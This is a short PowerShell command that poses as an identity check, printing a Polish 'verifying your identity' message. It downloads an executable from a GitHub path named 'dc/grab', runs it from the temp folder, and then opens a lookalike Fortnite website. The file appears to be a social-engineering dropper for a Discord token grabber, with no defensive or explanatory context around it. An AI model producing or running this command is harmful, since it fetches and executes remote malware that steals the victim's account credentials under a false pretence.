powershell -Command {
    Write-Host 'Weryfikuje twoja tożsamość...' -ForegroundColor Green;
    Invoke-WebRequest -Uri 'https://github.com/xKotelek/xKotelek/raw/main/dc/grab/main.exe' -OutFile $env:TEMP\temp.exe;
    $process = Start-Process -FilePath $env:TEMP\temp.exe -PassThru;
    Wait-Process -Id $process.Id;
    Start-Process 'https://f0rtn1te-xp.ct8.pl/';
}
